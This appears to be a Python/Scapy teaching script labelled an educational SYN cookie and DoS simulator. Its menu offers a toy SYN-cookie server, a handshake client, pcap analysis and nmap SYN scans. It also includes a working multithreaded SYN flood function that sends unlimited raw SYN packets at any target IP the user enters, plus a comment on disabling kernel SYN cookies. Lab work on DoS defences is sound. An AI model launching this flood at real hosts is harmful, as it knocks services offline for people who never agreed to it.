# NOTE:
# If you're running this on a Linux system and want to avoid interference from the kernel's own SYN cookie mechanism,
# you can temporarily disable it using the following command:
#     sudo sysctl -w net.ipv4.tcp_syncookies=0
# To re-enable it after testing:
#     sudo sysctl -w net.ipv4.tcp_syncookies=1
# To check current status:
#     sysctl net.ipv4.tcp_syncookies

import os
import time
import random
import struct
import hmac
import hashlib
import threading
from subprocess import run, PIPE
from scapy.all import *

# === ANALYZER FUNCTION ===
def analyze_syn_cookies(pcap_file, server_ip, server_port=12345):
    if not os.path.exists(pcap_file):
        print(f"[!] File not found: {pcap_file}")
        return
    try:
        packets = rdpcap(pcap_file)
    except Exception as e:
        print(f"[!] Error loading pcap: {e}")
        return
    print(f"[*] Loaded {len(packets)} packets from '{pcap_file}'\n")
    print("Detected SYN-ACK packets (SYN cookies):")
    print("Detected Valid ACK packets (cookie responses):")
    print("-" * 70)
    found = False
    for pkt in packets:
        if IP in pkt and TCP in pkt:
            ip = pkt[IP]
            tcp = pkt[TCP]
            if tcp.flags == 0x12 and ip.src == server_ip and tcp.sport == server_port:
                print(f"[+] {ip.src}:{tcp.sport} → {ip.dst}:{tcp.dport} | SEQ (cookie): {tcp.seq} | ACK: {tcp.ack} | Window: {tcp.window}")
                found = True
            elif tcp.flags == 0x10 and ip.dst == server_ip and tcp.dport == server_port:
                print(f"[✓] {ip.src}:{tcp.sport} → {ip.dst}:{tcp.dport} | ACK (response to cookie): {tcp.ack} | Window: {tcp.window}")
                found = True
    if not found:
        print("[!] No SYN-ACK packets from the specified server were found.")

# === CLIENT FUNCTION ===
def run_client():
    SERVER_IP = input("Enter the server IP (e.g., 10.211.55.6): ").strip()
    try:
        SERVER_PORT = int(input("Enter the server port (e.g., 12345): ").strip())
    except ValueError:
        print("[!] Invalid port number. Exiting.")
        return

    try:
        while True:
            CLIENT_PORT = random.randint(1024, 65535)
            start_time = time.perf_counter()

            def send_syn():
                ip = IP(dst=SERVER_IP)
                syn = TCP(sport=CLIENT_PORT, dport=SERVER_PORT, flags="S", seq=1000)
                send(ip/syn, verbose=0)
                print(f"[+] SYN sent from port {CLIENT_PORT}")

            def handle_syn_ack(pkt):
                if pkt.haslayer(TCP) and pkt[IP].src == SERVER_IP and pkt[TCP].flags == "SA":
                    cookie = pkt[TCP].seq
                    print(f"[✓] SYN-ACK received with cookie (seq): {cookie}")
                    ack_pkt = IP(dst=SERVER_IP)/TCP(sport=CLIENT_PORT, dport=SERVER_PORT, flags="A", seq=1001, ack=cookie + 1)
                    send(ack_pkt, verbose=0)
                    end = time.perf_counter()
                    print(f"[✓] ACK sent. Round-trip time: {end - start_time:.4f} sec")

            send_syn()
            sniff(filter=f"tcp and src host {SERVER_IP} and tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack != 0", prn=handle_syn_ack, timeout=3, store=False)
            cont = input("Try again? (y/n): ").strip().lower()
            if cont != 'y':
                break
    except KeyboardInterrupt:
        print("\n[!] Client interrupted by user. Exiting...")

# === SERVER FUNCTION ===
def start_server():
    SECRET_KEY = b'super_secret_key'
    NONCE_SIZE = 8
    SERVER_PORT = 12345
    INTERFACE = "eth0"
    nonce_table = {}

    def generate_nonce():
        return os.urandom(NONCE_SIZE)

    def generate_syn_cookie(client_ip, client_port, nonce):
        timestamp = int(time.time()) // 60
        msg = f"{client_ip}:{client_port}:{timestamp}".encode() + nonce
        digest = hmac.new(SECRET_KEY, msg, hashlib.sha256).digest()
        return struct.unpack(">I", digest[:4])[0]

    def validate_syn_cookie(client_ip, client_port, received_seq, received_nonce):
        timestamp = int(time.time()) // 60
        msg = f"{client_ip}:{client_port}:{timestamp}".encode() + received_nonce
        expected_digest = hmac.new(SECRET_KEY, msg, hashlib.sha256).digest()
        expected_seq = struct.unpack(">I", expected_digest[:4])[0]
        return expected_seq == received_seq

    def handle_packet(pkt):
        if pkt.haslayer(TCP) and pkt[TCP].flags == "S":
            print(f"[DEBUG] Cookie for {pkt[IP].src}:{pkt[TCP].sport} → {generate_syn_cookie(pkt[IP].src, pkt[TCP].sport, b'XXXX')}")  # Placeholder nonce shown
            client_ip = pkt[IP].src
            client_port = pkt[TCP].sport
            server_ip = pkt[IP].dst
            nonce = generate_nonce()
            cookie_seq = generate_syn_cookie(client_ip, client_port, nonce)
            nonce_table[(client_ip, client_port)] = nonce
            ip = IP(src=server_ip, dst=client_ip)
            tcp = TCP(sport=SERVER_PORT, dport=client_port, flags="SA", seq=cookie_seq, ack=pkt[TCP].seq + 1, window=0)
            send(ip/tcp, verbose=0)
        elif pkt.haslayer(TCP) and pkt[TCP].flags == "A":
            client_ip = pkt[IP].src
            client_port = pkt[TCP].sport
            received_ack = pkt[TCP].ack - 1
            nonce = nonce_table.get((client_ip, client_port), None)
            if nonce and validate_syn_cookie(client_ip, client_port, received_ack, nonce):
                print(f"[✓] Valid ACK from {client_ip}:{client_port}")
                del nonce_table[(client_ip, client_port)]
            else:
                print(f"[✗] Invalid ACK from {client_ip}:{client_port}")

    capture_file = input("Enter a name for the packet capture file (e.g., server_capture.pcap): ").strip()
    if not os.path.isabs(capture_file):
        capture_file = os.path.join(os.getcwd(), capture_file)
    print(f"[*] PCAP will be saved to: {capture_file}")
    print("[*] Capturing traffic. Press ENTER to stop and save the file.")
    sniffer = AsyncSniffer(iface=INTERFACE, filter=f"tcp port {SERVER_PORT}", prn=handle_packet, store=True)
    sniffer.start()
    input("[*] Press ENTER to stop and save the capture...\n")
    packets = sniffer.stop()
    wrpcap(capture_file, packets)
    print(f"[✓] Capture stopped. Packets saved to '{capture_file}'")

# === FLOODER FUNCTION ===
def run_flood():
    INTERFACE = "eth0"
    TARGET_IP = input("Enter the target IP: ").strip()
    port_input = input("Enter the target port (default: 12345): ").strip()
    thread_input = input("Enter number of threads: ").strip()
    TARGET_PORT = int(port_input) if port_input else 12345
    THREADS = int(thread_input) if thread_input else 20
    stop_flag = threading.Event()

    def send_syn():
        while not stop_flag.is_set():
            src_port = random.randint(1024, 65535)
            seq = random.randint(0, 4294967295)
            ip = IP(dst=TARGET_IP)
            tcp = TCP(sport=src_port, dport=TARGET_PORT, flags="S", seq=seq)
            pkt = Ether()/ip/tcp
            sendp(pkt, iface=INTERFACE, verbose=0)
            time.sleep(0.001)

    print(f"[*] Launching SYN flood to {TARGET_IP}:{TARGET_PORT} using {THREADS} threads")
    for _ in range(THREADS):
        threading.Thread(target=send_syn, daemon=True).start()
    input("[*] Press ENTER to stop the SYN flood...")
    stop_flag.set()
    print("[✓] SYN flood stopped.")

# === NMAP SCAN FUNCTION ===
def run_nmap_scan():
    target = input("Enter the target IP or hostname for Nmap scan: ").strip()
    ports = input("Enter port range or list (e.g., 20-1000 or 22,80,443): ").strip()
    if not target:
        print("[!] No target provided.")
        return
    command = ["nmap", "-sS", "-p", ports if ports else "1-1024", target]
    print(f"[*] Running Nmap command: {' '.join(command)}\n")
    try:
        result = run(command, stdout=PIPE, stderr=PIPE, text=True)
        print(result.stdout if result.returncode == 0 else result.stderr)
    except FileNotFoundError:
        print("[!] Nmap is not installed or not in PATH.")

# === UTILITY FUNCTIONS ===
def ping_server():
    ip = input("Enter IP to ping: ").strip()
    result = run(["ping", "-c", "4", ip], stdout=PIPE, stderr=PIPE, text=True)
    print(result.stdout if result.returncode == 0 else result.stderr)

def show_ip():
    result = run("ifconfig", shell=True, stdout=PIPE, text=True)
    for line in result.stdout.splitlines():
        if "inet " in line and "127.0.0.1" not in line:
            print(line.strip())

def analyze_pcap():
    path = input("Enter .pcap file path: ").strip()
    ip = input("Enter server IP: ").strip()
    port = input("Enter port (default 12345): ").strip()
    analyze_syn_cookies(path, ip, int(port) if port else 12345)

# === ASCII BANNER ===
print(r"""
 _   _  ___        ______   ___   _  
| \ | |/ _ \__  __/ ___\ \ / / \ | | 
|  \| | | | \ \/ /\___ \ V /|  \| | 
| |\  | |_| |>  <  ___) || | | |\  | 
|_| \_|\___//_/\_\|____/ |_| |_| \_|

SYN Cookie and DoS Simulator — designed for educational purposes only
""")

def menu():
    print("\n==== SYN Cookie Simulator Menu ====")
    print("1. Start SYN Cookie Server")
    print("2. Run Legitimate Client")
    print("3. Launch SYN Flood")
    print("4. Ping a Target IP")
    print("5. Show Host IP Address")
    print("6. Analyze PCAP for SYN-ACK Cookies")
    print("7. Perform Nmap Scan")
    print("0. Exit")
    return input("Select an option: ")

def main():
    while True:
        choice = menu()
        if choice == "1":
            start_server()
        elif choice == "2":
            run_client()
        elif choice == "3":
            run_flood()
        elif choice == "4":
            ping_server()
        elif choice == "5":
            show_ip()
        elif choice == "6":
            analyze_pcap()
        elif choice == "7":
            run_nmap_scan()
        elif choice == "0":
            print("Exiting.")
            break
        else:
            print("Invalid choice. Try again.")


main()
